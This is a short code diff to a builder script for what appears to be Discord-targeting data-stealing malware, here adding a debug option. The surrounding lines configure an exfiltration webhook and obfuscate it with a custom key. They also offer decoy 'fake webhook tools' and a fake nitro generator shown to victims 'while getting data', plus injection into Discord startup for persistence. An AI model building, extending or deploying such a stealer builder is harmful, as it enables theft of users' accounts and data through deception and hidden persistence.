@@ -134,7 +134,7 @@ while True:
         except:
             print('Invalid Webhook')
 
-
+    Debug = get_boolean_input('Enable Debugging (Useful to share error (Will print and save error in a txt file)) Y/N ')
     FakeWeb = get_boolean_input('Enable Fake Webhook Module (When the file is launched it will show a Webhook Tools while getting data) Y/N: ')
     FakeGen = get_boolean_input('enable Fake Generator Module (When the file is launched it will show a nitro generator while getting data) Y/N: ')
     Injection = get_boolean_input('Inject the script to discord Startup Y/N: ')
@@ -195,6 +195,7 @@ while True:
 
     Webhook = obf(Webhook.encode(), custom_key)
     new_content = content.replace("'%Webhook%'", f'{str(Webhook)}' + ',' + f'{str(custom_key)}')
+    new_content = new_content.replace("'%Debug%'", str(Debug))
     new_content = new_content.replace("'%FakeWebhook%'", str(FakeWeb))
     new_content = new_content.replace("'%FakeGen%'", str(FakeGen))
     new_content = new_content.replace("'%Injection%'", str(Injection))
